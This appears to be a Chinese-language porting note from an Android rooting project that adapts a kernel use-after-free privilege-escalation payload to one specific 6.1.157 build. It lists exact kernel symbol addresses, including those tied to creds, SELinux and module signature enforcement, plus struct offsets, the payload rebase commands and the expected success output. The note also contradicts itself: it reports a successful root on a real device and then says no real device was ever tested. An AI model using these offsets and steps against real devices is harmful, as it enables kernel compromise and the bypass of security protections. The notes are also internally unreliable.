# 6.1.157 g8d63307071ad 静态适配

## 来源镜像

```text
boot_ota_1794143607737.img
sha256 b234993bcc2e0284184f8296f6965231934709d23fa3da29ac21868d0ad459f4
```

```text
Linux version 6.1.157-android14-11-g8d63307071ad
```

这是 6.1.157 的新 `-g<commit>` 构建，之前 6.1.157 已支持
`g7d3922fade43`、`g2646292297b1`、`gaaa383620ebf`、`g3306a328b7be`、
`g84ffa64b710b`、`g77f76e323a02`。厂商内核的关键符号不在 `/proc/kallsyms`
的导出集里，所以必须用镜像内嵌 kallsyms/BTF 离线推导，不能套用邻构建。

## 常量推导

用 `vmlinux-to-elf` 从 arm64 Image 重建符号 ELF（116,742 个符号），
`llvm-objdump` 核对调用点：

```text
do_timer_create+0xb8   bl kmem_cache_alloc 返回地址
prepare_creds+0x20     bl kmem_cache_alloc 返回地址
```

`vmlinux-to-elf` 把链接基址猜成 `0xffffffc008000000`；这是本项目静态
payload 使用的 **raw base**（`success-profiles.json` 顶部的
`raw_link_bias_subtracted = 0x78000000`）。真实内核链接地址是 raw +
`0x78000000`，但 CGA 模块和静态 payload 都按 raw base 存储，由
`ko_slide_patch` / 载荷 slide 负责补齐。

BTF 核对（同一 Image）：

```text
task_struct.cred=0x840 real_cred=0x838 comm=0x850 size=0x1300
cred size=0xb0（uid/gid/fsuid... 与既有 g84/g77f 的 0xb0 布局一致）
k_itimer.it=0x78 size=0x118
```

因此 payload 必须使用 `TASK_CRED=0x840`、`KITIMER_SIZE=0x118`，与
g77f/gce849/g40b1/g84 的 BTF 审计布局同族。

| 符号 | raw base 值（写入 payload/CGA） | 实际链接值（raw + 0x78000000） |
| --- | --- | --- |
| `timer_link` | `0xffffffc0084a8d90` | `0xffffffc0804a8d90` |
| `cred_link` | `0xffffffc00804b790` | `0xffffffc08004b790` |
| `selinux_minus7` | `0xffffffc00a84b3a1` | `0xffffffc08284b3a1` |
| `sig_enforce` | `0xffffffc00a5a01a0` | `0xffffffc0825a01a0` |
| `init_user_ns` | `0xffffffc00a212910` | `0xffffffc082212910` |
| `root_user` | `0xffffffc00a212ba0` | `0xffffffc082212ba0` |
| `init_groups` | `0xffffffc00a213ec0` | `0xffffffc082213ec0` |
| `init_ucounts` | `0xffffffc00a214430` | `0xffffffc082214430` |

## 成功载荷 rebase

`binary-sources/61157-g264/success-profiles.json` 新增 `g8d6` profile，
`PROFILE_NAMES` 同步；沿用 g264 成功静态载荷做确定性 rebase：

```sh
python3 -I binary-sources/61157-g264/rebase_success_payload.py apply \
  --base main/app/assets/98260-g264/exploit-android-key-ptr \
  --profiles binary-sources/61157-g264/success-profiles.json \
  --output-root main/app/assets --only g8d6
```

```text
98260-g8d6/exploit-android-key-ptr  6b118559a691f45d51cccb0815b623b1d03c5801df40f2beb34b995659bcc7d6
```

这个 hash 与 g84 的 payload 相同，原因是本构建的 7 个关键地址、cred
布局和 k_itimer 尺寸与 g84 **全部一致**，静态载荷只改这些常量，字节自然
相同；它不是复制 g84 的资产：`target.sh` 精确绑定 `g8d63307071ad`，CGA
模块和 `syms-g8d6.txt` 都不同（见下）。

## CGA 模块与符号表

```sh
python3 -I binary-sources/61157-g264/rebase_cga_module.py apply \
  --base binary-sources/61157-g264/legacy-cga/ksm-g264-base.ko \
  --profiles binary-sources/61157-g264/cga-profiles.json \
  --output-root main/app/assets/g264 --only g8d6
python3 -I tools/gen_6157_syms_from_cga.py
```

```text
g264/ksm-g8d6-base.ko   e9c20b2904742f26f3242da3983fcdaaf13fdea4503c3f38aac50e2767250321
g264/syms-g8d6.txt      65df4d0dbfd8d35b2dd3e9732e323ff3a7acfd9a4a46d730af50b18e7c214d97（358 项：250 CGA 符号 + g8d6.elf 补齐的 init_cred 0xffffffc00a213ec8 与全部 5 种 6.1 管理器 LKM 依赖符号）
```

CGA 模块的 225 个 SHN_ABS 符号全部解析自本镜像的 raw-base vmlinux，
vermagic 已改写为 `6.1.157-android14-11-g8d63307071ad`；`_printk`
`0xffffffc008c84dd4` 可用作 live link 校验锚点。

## 路由与 KSU

```text
run.sh 6.1 分派 -> 98260/run6157_full.sh
P6157=g8d6
  -> B=$D/98260-g8d6
  -> G264_BASE=$D/g264/ksm-g8d6-base.ko
  -> 管理器 KO 优先：try_manager_ko_6157（runtime kallsyms）
  -> 回退：CGA / g264 helper
```

`KernelLogHelper.PROFILES_6157`、`tools/kernel_profiles.json`、
`6157-integrity.tsv`、`MainActivity` 的资产注册和部署 chmod 已同步。
`6157-integrity.tsv` 的 g8d6 行共 11 项，与 runner 的默认 `_want=11` 一致。

## 2026-11-13 真机反馈修复

g8d6 首次真机运行 root 成功，但管理器 KO patch 报
`MISSING_SYM=commit_creds`（vendor kallsyms 隐藏），CGA 回退又因
`_printk` 相差 `0x3d0` 失败。

修复：`try_manager_ko_6157` 在 runtime kallsyms 第一遍 patch 后如果仍有
missing，就用 per-build CGA 表加 boot slide 对**已 patch 的模块**做第二遍
填充。第一遍已写成 SHN_ABS 的符号不会被覆盖，所以 runtime 地址保持正确，
只补齐 `commit_creds` 这类 runtime kallsyms 看不到的符号。

## 验证状态

**仅静态适配**：没有 `g8d63307071ad` 真机，未触发 UAF，未加载模块。
首个设备测试应关注：

```text
98260_ASSET_INTEGRITY=ok profile=g8d6 files=11
98260_KSU_MANAGER_KO_SYMS=runtime kallsyms=... slide=0
98260_KSU_MANAGER_KO_PATCH ... missing=0
98260_KSU_MANAGER_KO_INSMOD rc=0
98260_KSU=loaded method=manager-ko-patched
98260_SUCCESS=1
```

如果 runtime kallsyms 不可读，runner 默认会跳过 manager-KO 并回退到
`ksm-g8d6-base.ko`；per-build syms 表只在显式
`MAGICROOT_6157_MANAGER_KO_ALLOW_CGA_SYMS=1` 时作为 manager-KO 的回退。
